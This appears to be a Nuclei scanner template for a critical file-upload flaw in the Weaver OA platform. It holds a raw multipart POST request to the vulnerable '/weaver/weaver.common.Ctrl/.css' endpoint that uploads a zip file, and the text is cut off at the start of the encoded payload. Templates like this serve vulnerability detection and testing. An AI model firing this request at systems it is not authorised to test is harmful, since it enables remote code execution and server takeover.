id: weaver-oa-file-upload

info:
  name: Weaver OA File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Weaver OA platform contains a file upload vulnerability in the endpoint
    `/weaver/weaver.common.Ctrl/.css`. Exploiting this vulnerability can lead to
    remote code execution via uploading malicious files.
  reference:
    - https://ailiqun.xyz/2021/05/02/%E6%B3%9B%E5%BE%AEOA-%E5%89%8D%E5%8F%B0GetShell%E5%A4%8D%E7%8E%B0/

http:
  - raw:
      - |
        POST /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=96659c4ff80b4193cba17acfa5f1f109

        --96659c4ff80b4193cba17acfa5f1f109
        Content-Disposition: form-data; name="file1"; filename="Ezrqf4x8.zip"
        Content-Type: application/zip

        {{base64_decode("
